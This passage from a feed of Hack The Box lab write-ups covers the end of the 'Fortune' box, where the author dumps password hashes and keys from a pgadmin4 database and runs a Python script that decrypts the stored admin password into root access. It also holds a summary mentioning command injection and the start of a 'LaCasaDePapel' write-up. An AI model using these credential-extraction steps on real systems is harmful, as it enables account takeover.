&lt;h4 id=&quot;note--pgadmin-is-an-administration-and-development-platform-for-postgresql&quot;&gt;Note : &lt;a href=&quot;https://www.pgadmin.org/&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;pgadmin&lt;/code&gt;&lt;/a&gt; is an administration and development platform for &lt;code class=&quot;highlighter-rouge&quot;&gt;PostgreSQL&lt;/code&gt;.&lt;/h4&gt;
&lt;h4 id=&quot;earlier-when-we-got-the-elevated-network-access-there-was-an-http-port-for-pgadmin4-so-i-checked-its-web-directory-in-varappsrv-and-the-database-was-there-&quot;&gt;Earlier when we got the elevated network access there was an &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt; port for &lt;code class=&quot;highlighter-rouge&quot;&gt;pgadmin4&lt;/code&gt; so I checked its web directory in &lt;code class=&quot;highlighter-rouge&quot;&gt;/var/appsrv&lt;/code&gt; and the database was there :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;fortune$ cd /var/appsrv/                                                                                                                                                                                          
fortune$ ls -la
total 20
drwxr-xr-x   5 root       wheel     512 Nov  2  2018 .
drwxr-xr-x  24 root       wheel     512 Nov  2  2018 ..
drwxr-xr-x   5 _fortune   _fortune  512 Aug  2 09:15 fortune
drwxr-x---   4 _pgadmin4  wheel     512 Nov  3  2018 pgadmin4
drwxr-xr-x   4 _sshauth   _sshauth  512 Feb  3 05:08 sshauth
fortune$ cd pgadmin4/                                                                                                                                                                                             
fortune$ ls -la
total 252
drwxr-x---  4 _pgadmin4  wheel     512 Nov  3  2018 .
drwxr-xr-x  5 root       wheel     512 Nov  2  2018 ..
-rw-r-----  1 _pgadmin4  wheel  118784 Nov  3  2018 pgadmin4.db
-rw-r-----  1 _pgadmin4  wheel     479 Nov  3  2018 pgadmin4.ini
drwxr-x---  2 _pgadmin4  wheel     512 Nov  3  2018 sessions
drwxr-x---  3 _pgadmin4  wheel     512 Nov  3  2018 storage
fortune$ 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;i-downloaded-it-on-my-machine-&quot;&gt;I downloaded it on my machine :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/fortune/ssh# scp -i id_rsa charlie@fortune.htb:/var/appsrv/pgadmin4/pgadmin4.db ../
pgadmin4.db                                                                                                                                                                      100%  116KB   7.7KB/s   00:15    
root@kali:~/Desktop/HTB/boxes/fortune/ssh# 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;then-i-used-strings-to-see-if-i-can-get-anything-interesting-&quot;&gt;Then I used &lt;code class=&quot;highlighter-rouge&quot;&gt;strings&lt;/code&gt; to see if I can get anything interesting :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/fortune# strings pgadmin4.db
SQLite format 3
indexsqlite_autoindex_debugger_function_arguments_1debugger_function_arguments

----------------
 Removed Output
----------------

ConfigDB
	ConfigDB
bob@fortune.htb$pbkdf2-sha512$25000$z9nbm1Oq9Z5TytkbQ8h5Dw$Vtx9YWQsgwdXpBnsa8BtO5kLOdQGflIZOQysAy7JdTVcRbv/6csQHAJCAIJT9rLFBawClFyMKnqKNL5t3Le9vg
charlie@fortune.htb$pbkdf2-sha512$25000$3hvjXAshJKQUYgxhbA0BYA$iuBYZKTTtTO.cwSvMwPAYlhXRZw8aAn9gBtyNQW3Vge23gNUMe95KqiAyf37.v1lmCunWVkmfr93Wi6.W.UzaQ
bob@fortune.htb
3	charlie@fortune.htb

----------------
 Removed Output
----------------

9eSECURITY_PASSWORD_SALTqIhAhRt3xq_dzIEqyJQFmWnymFbO1cZVhbQaTWA-v9Q=9
!eSECRET_KEYR_EFY1hb236guS3jNq1aHyPcruXbjk7Ff-QwL6PMqJM=?
-eCSRF_SESSION_KEYsaQWKx5BCyVZMH2weOiNv3Dsvzh4GchPM16kwBRYPxs=

----------------
 Removed Output
----------------

8postgresdbautUU0jkamCZDmqFLOrAuPjFxL0zp8zWzISe5MF0GY/l8Silrmu3caqrtjaVjLQlvFFEgESGzprefer&amp;lt;STORAGE_DIR&amp;gt;/.postgresql/postgresql.crt&amp;lt;STORAGE_DIR&amp;gt;/.postgresql/postgresql.key22

----------------
 Removed Output
----------------
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;i-got-some-salted-hashes-and-most-importantly-this-&quot;&gt;I got some salted hashes, and most importantly this :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;postgresdba utUU0jkamCZDmqFLOrAuPjFxL0zp8zWzISe5MF0GY/l8Silrmu3caqrtjaVjLQlvFFEgESGz
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;this-is-the-db-administrators-password-hash-and-we-know-that-its-the-same-as-the-root-password&quot;&gt;This is the db administrator’s password hash and we know that it’s the same as the root password.&lt;/h4&gt;
&lt;h4 id=&quot;pgadmin-is-an-open-source-software-so-i-searched-on-github-for-any-cryptography-related-stuff-and-found-this-script-called-cryptopy&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;pgadmin&lt;/code&gt; is an open-source software so I searched on &lt;code class=&quot;highlighter-rouge&quot;&gt;github&lt;/code&gt; for any cryptography related stuff and found this script called &lt;a href=&quot;https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;crypto.py&lt;/code&gt;&lt;/a&gt;.&lt;/h4&gt;
&lt;h4 id=&quot;i-took-the-functions-needed-to-decrypt-the-hash-then-i-created-a-script-to-take-the-hashthe-key-and-decrypt-the-hash-using-the-functions-from-cryptopy&quot;&gt;I took the functions needed to decrypt the hash then I created a script to take the hash/the key and decrypt the hash using the functions from &lt;code class=&quot;highlighter-rouge&quot;&gt;crypto.py&lt;/code&gt;:&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/usr/bin/python&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;__future__&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;division&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;base64&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;hashlib&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;os&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;six&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;cryptography.hazmat.backends&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;default_backend&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;cryptography.hazmat.primitives.ciphers&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Cipher&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;cryptography.hazmat.primitives.ciphers.algorithms&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AES&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;cryptography.hazmat.primitives.ciphers.modes&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CFB8&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;padding_string&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'}'&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;iv_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AES&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;block_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;//&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;


&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;pad&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;&quot;&quot;Add padding to the key.&quot;&quot;&quot;&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;isinstance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;six&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;

    &lt;span class=&quot;c&quot;&gt;# Key must be maximum 32 bytes long, so take first 32 bytes&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;

    &lt;span class=&quot;c&quot;&gt;# If key size is 16, 24 or 32 bytes then padding is not required&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;

    &lt;span class=&quot;c&quot;&gt;# Add padding to make key 32 bytes long&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ljust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;padding_string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;decrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ciphertext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;&quot;&quot;
    Decrypt the AES encrypted string.

    Parameters:
        ciphertext -- Encrypted string with AES method.
        key        -- key to decrypt the encrypted string.
    &quot;&quot;&quot;&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;ciphertext&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base64&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b64decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ciphertext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;iv&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ciphertext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;iv_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;cipher&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Cipher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pad&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CFB8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;iv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;default_backend&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;decryptor&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cipher&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decryptor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;decryptor&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;update&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ciphertext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;iv_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;decryptor&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;finalize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;ciphertext&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;raw_input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;hash : &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;raw_input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;key : &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;password&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;decrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ciphertext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;[*] Password : &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;the-only-thing-left-is-to-give-the-right-key-i-tried-the-other-hashes-i-got-from-the-database-as-a-key-and-bobs-hash-worked-&quot;&gt;The only thing left is to give the right key, I tried the other hashes I got from the database as a key and &lt;code class=&quot;highlighter-rouge&quot;&gt;bob&lt;/code&gt;’s hash worked :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$pbkdf2-sha512$25000$z9nbm1Oq9Z5TytkbQ8h5Dw$Vtx9YWQsgwdXpBnsa8BtO5kLOdQGflIZOQysAy7JdTVcRbv/6csQHAJCAIJT9rLFBawClFyMKnqKNL5t3Le9vg
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/fortune# ./decrypt.py 
hash : utUU0jkamCZDmqFLOrAuPjFxL0zp8zWzISe5MF0GY/l8Silrmu3caqrtjaVjLQlvFFEgESGz
key : $pbkdf2-sha512$25000$z9nbm1Oq9Z5TytkbQ8h5Dw$Vtx9YWQsgwdXpBnsa8BtO5kLOdQGflIZOQysAy7JdTVcRbv/6csQHAJCAIJT9rLFBawClFyMKnqKNL5t3Le9vg
[*] Password : R3us3-0f-a-P4ssw0rdl1k3th1s?_B4D.ID3A!
root@kali:~/Desktop/HTB/boxes/fortune# 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/fortune/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-we-owned-root-&quot;&gt;And we owned root !&lt;/h4&gt;
&lt;h4 id=&quot;thats-it--feedback-is-appreciated-&quot;&gt;That’s it , Feedback is appreciated !&lt;/h4&gt;
&lt;h4 id=&quot;dont-forget-to-read-the-previous-write-ups--tweet-about-the-write-up-if-you-liked-it--follow-on-twitter-for-awesome-resources-ahm3d_h3sham&quot;&gt;Don’t forget to read the &lt;a href=&quot;/categories&quot;&gt;previous write-ups&lt;/a&gt; , Tweet about the write-up if you liked it , follow on twitter for awesome resources &lt;a href=&quot;https://twitter.com/Ahm3d_H3sham&quot;&gt;@Ahm3d_H3sham&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;thanks-for-reading&quot;&gt;Thanks for reading.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;previous-hack-the-box-write-up--hack-the-box---lacasadepapel&quot;&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/lacasadepapel/&quot;&gt;Hack The Box - LaCasaDePapel&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;next-hack-the-box-write-up--hack-the-box---arkham&quot;&gt;Next Hack The Box write-up : &lt;a href=&quot;/hack-the-box/arkham/&quot;&gt;Hack The Box - Arkham&lt;/a&gt;&lt;/h4&gt;
&lt;hr /&gt;</content><author><name></name></author><category term="BSD" /><category term="Web" /><category term="RCE" /><category term="Python" /><category term="Exploit Development" /><category term="Networking" /><category term="Pivoting" /><category term="ssh" /><category term="php" /><summary type="html">Quick Summary Hey guys today Fortune retired and here’s my write-up about it. It was a very cool box and I really liked it, like the last retired box LaCasaDePapel it had RCE and client certificate generation to access a restricted https service, but that’s only for the initial steps as this box had a lot of interesting stuff. It’s an OpenBSD box and its ip is 10.10.10.127, I added it to /etc/hosts as fortune.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC fortune.htb We have http, https on port 80, port 443 and we have ssh on port 22 so we will be focusing on the web services. HTTP Initial Enumeration The index page on http://fortune.htb is pretty simple, we have some options where we can choose a database of fortunes and we will get a random fortune from that database : On https://fortune.htb we get a handshake error, this probably means that we need a client certificate. RCE, Client Certificate Generation Back to http://fortune.htb I intercepted the request with burp and there was only one parameter in the POST request called db, after trying some different things I could get RCE by appending a semi-colon ; : Request : ``` POST /select HTTP/1.1 Host: fortune.htb User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: http://fortune.htb/ Content-Type: application/x-www-form-urlencoded Content-Length: 7 Connection: close Upgrade-Insecure-Requests: 1</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/hackthebox/fortune/0.png" /></entry><entry><title type="html">Hack The Box - LaCasaDePapel</title><link href="http://localhost:4000/hack-the-box/lacasadepapel/" rel="alternate" type="text/html" title="Hack The Box - LaCasaDePapel" /><published>2019-07-27T00:00:00+02:00</published><updated>2019-07-27T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/lacasadepapel</id><content type="html" xml:base="http://localhost:4000/hack-the-box/lacasadepapel/">&lt;hr /&gt;

&lt;h3 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h3&gt;
&lt;h4 id=&quot;hey-guys-today-lacasadepapel-retired-and-heres-my-write-up-about-it-it-was-an-easy-interesting-box-more-of-a-ctf-challenge-than-a-realistic-scenario-but-i-still-enjoyed-it-its-a-linux-box-and-its-ip-is-101010131-i-added-it-to-etchosts-as-lacasadepapelhtb-lets-jump-right-in-&quot;&gt;Hey guys today LaCasaDePapel retired and here’s my write-up about it. It was an easy interesting box, more of a ctf challenge than a realistic scenario but I still enjoyed it. It’s a Linux box and its ip is &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.131&lt;/code&gt;, I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;lacasadepapel.htb&lt;/code&gt;. Let’s jump right in !&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/lacasadepapel/0.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
&lt;h4 id=&quot;as-always-we-will-start-with-nmap-to-scan-for-open-ports-and-services-&quot;&gt;As always we will start with &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; to scan for open ports and services :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sV -sT -sC lacasadepapel.htb&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/lacasadepapel/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-have-http-on-port-80-https-on-port-443-ftp-on-port-21-and-ssh-on-port-22&quot;&gt;We have &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt; on port 80. &lt;code class=&quot;highlighter-rouge&quot;&gt;https&lt;/code&gt; on port 443, &lt;code class=&quot;highlighter-rouge&quot;&gt;ftp&lt;/code&gt; on port 21 and &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh&lt;/code&gt; on port 22.&lt;/h4&gt;
&lt;h4 id=&quot;anonymous-authentication-wasnt-allowed-on-ftp-so-i-checked-http-and-https-&quot;&gt;Anonymous authentication wasn’t allowed on &lt;code class=&quot;highlighter-rouge&quot;&gt;ftp&lt;/code&gt; so I checked &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;https&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/lacasadepapel# ftp lacasadepapel.htb
Connected to lacasadepapel.htb.
220 (vsFTPd 2.3.4)
Name (lacasadepapel.htb:root): anonymous
331 Please specify the password.
Password:
530 Login incorrect.
Login failed.
ftp&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;http&quot;&gt;HTTP&lt;/h3&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;http://lacasadepapel.htb&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/lacasadepapel/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-see-an-image-of-the-characters-from-lacasadepapel-tv-show-and-a-qr-code-for-otp-i-scanned-it-with-google-authenticator-on-my-phone-&quot;&gt;We see an image of the characters from &lt;a href=&quot;https://www.imdb.com/title/tt6468322/&quot;&gt;LaCasaDePapel&lt;/a&gt; (TV show) and a QR code for &lt;code class=&quot;highlighter-rouge&quot;&gt;OTP&lt;/code&gt;, I scanned it with &lt;a href=&quot;https://play.google.com/store/apps/details?id=com.google.android.apps.authenticator2&amp;amp;hl=en&quot;&gt;Google Authenticator&lt;/a&gt; on my phone :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/lacasadepapel/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;as-you-can-see-i-had-to-refresh-it-manually-while-other-tokens-refreshed-automatically-no-idea-why-but-anyway-i-took-the-otp-and-used-testtestcom-as-email-&quot;&gt;As you can see I had to refresh it manually while other tokens refreshed automatically, no idea why but anyway I took the &lt;code class=&quot;highlighter-rouge&quot;&gt;OTP&lt;/code&gt; and used &lt;code class=&quot;highlighter-rouge&quot;&gt;test@test.com&lt;/code&gt; as email :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/lacasadepapel/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;then-nothing-happened-i-just-got-the-same-page-back-again-i-tried-gobuster-to-see-if-i-can-find-any-sub-directories-and-i-didnt-get-anything-useful-lets-check-https&quot;&gt;Then nothing happened, I just got the same page back again. I tried &lt;code class=&quot;highlighter-rouge&quot;&gt;gobuster&lt;/code&gt; to see if I can find any sub directories and I didn’t get anything useful. Let’s check &lt;code class=&quot;highlighter-rouge&quot;&gt;https&lt;/code&gt;.&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;https://lacasadepapel.htb&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/lacasadepapel/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;the-same-background-with-an-error-message-saying--sorry-but-you-need-to-provide-a-client-certificate-to-continue&quot;&gt;The same background with an error message saying : “Sorry, but you need to provide a client certificate to continue.”&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;vsftpd-234-psy-shell&quot;&gt;vsftpd 2.3.4, Psy Shell&lt;/h3&gt;
